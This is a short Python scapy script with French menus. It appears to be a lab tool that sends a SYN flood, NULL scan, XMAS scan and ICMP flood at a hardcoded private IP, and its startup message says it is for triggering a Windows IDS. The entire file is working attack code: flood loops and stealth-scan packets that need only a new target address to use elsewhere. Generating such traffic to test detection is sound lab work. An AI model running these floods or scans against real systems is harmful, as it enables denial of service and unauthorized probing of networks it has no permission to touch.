#!/usr/bin/env python3
import os
import sys
import time
from scapy.all import IP, TCP, ICMP, send

TARGET_IP = '192.168.209.133'

MENU_TEXT = '''
=== Kali Attack Menu ===
Cible : {target}

1. SYN Flood
2. NULL Scan
3. XMAS Scan
4. ICMP Flood
5. Quitter
'''.format(target=TARGET_IP)


def send_syn_flood():
    print(f"[*] Lancement d'un SYN Flood sur {TARGET_IP}...")
    for _ in range(150):
        packet = IP(dst=TARGET_IP)/TCP(dport=80, flags='S')
        send(packet, verbose=0)
        time.sleep(0.01)
    print('[+] SYN Flood envoyé.')


def send_null_scan():
    print(f"[*] Lancement d'un NULL Scan sur {TARGET_IP}...")
    packet = IP(dst=TARGET_IP)/TCP(dport=80, flags='')
    send(packet, verbose=0)
    print('[+] NULL Scan envoyé.')


def send_xmas_scan():
    print(f"[*] Lancement d'un XMAS Scan sur {TARGET_IP}...")
    packet = IP(dst=TARGET_IP)/TCP(dport=80, flags='FPU')
    send(packet, verbose=0)
    print('[+] XMAS Scan envoyé.')


def send_icmp_flood():
    print(f"[*] Lancement d'un ICMP Flood sur {TARGET_IP}...")
    for _ in range(250):
        packet = IP(dst=TARGET_IP)/ICMP()
        send(packet, verbose=0)
        time.sleep(0.005)
    print('[+] ICMP Flood envoyé.')


def main():
    while True:
        print(MENU_TEXT)
        choice = input('Choisissez une attaque (1-5) : ').strip()
        if choice == '1':
            send_syn_flood()
        elif choice == '2':
            send_null_scan()
        elif choice == '3':
            send_xmas_scan()
        elif choice == '4':
            send_icmp_flood()
        elif choice == '5':
            print('Au revoir.')
            sys.exit(0)
        else:
            print('Option invalide. Veuillez réessayer.')
        input('\nAppuyez sur Entrée pour revenir au menu...')


if __name__ == '__main__':
    print('Assurez-vous que l\'IDS Windows est actif avant de lancer les attaques.')
    time.sleep(1)
    main()
